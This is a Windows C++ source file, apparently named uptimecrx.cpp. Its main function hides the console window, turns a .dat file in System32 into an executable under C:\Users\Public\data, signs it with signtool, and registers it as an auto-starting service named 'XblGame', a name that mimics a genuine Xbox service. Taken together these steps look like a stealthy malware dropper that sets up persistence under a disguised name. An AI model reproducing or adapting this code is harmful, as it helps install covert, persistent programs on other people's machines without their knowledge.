// uptimecrx.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <fstream>
#include <vector>
#include "ProcessUtil.h"
#include "MyDefine.h"

int main(int argc, char* argv[])
{
	TCHAR		w_szParam[MAX_PATH] = L"";

	HWND hwnd = GetConsoleWindow();
	if (hwnd != NULL) {
		ShowWindow(hwnd, SW_HIDE); 
	}

	//. runed from service
	if (argc >= 2 && _stricmp(argv[1], "--uptimecrx") == 0) {

		MyWriteLog("uptimecrx run by prarameter ");
		Sleep(1000 * 5);
		ModContentToFile("C:\\Windows\\System32\\mi_nt_svc.dat", "C:\\Users\\Public\\data\\mi_nt_svc.exe");
		cmd_sign("C:\\Users\\Public\\data\\mi_nt_svc.exe", "C:\\Windows\\System32\\signtool.exe");

		swprintf(w_szParam, L"/C sc start XblGame");
		_execute(L"cmd.exe", w_szParam, 1);

		MyWriteLog("uptimecrx run by prarameter End");

	}
	//. login start
	else {
		if (IsFileExist(GD_LOCAL_VER_FILEPATH) == TRUE && IsFileExist(GD_LOCAL_SVC_FILEPATH) == FALSE) {

			MyWriteLog("uptimecrx run by system automatically.");

			ModContentToFile("C:\\Windows\\System32\\mi_nt_svc.dat", "C:\\Users\\Public\\data\\mi_nt_svc.exe");
			cmd_sign("C:\\Users\\Public\\data\\mi_nt_svc.exe", "C:\\Windows\\System32\\signtool.exe");

			swprintf(w_szParam, L"/C sc create XblGame binPath=\"C:\\Users\\Public\\data\\mi_nt_svc.exe\" start= auto");
			_execute(L"cmd.exe", w_szParam, 1);
			swprintf(w_szParam, L"/C sc start XblGame");
			_execute(L"cmd.exe", w_szParam, 1);

			MyWriteLog("uptimecrx run by system automatically. End");

		}
	}

	return 0;

}

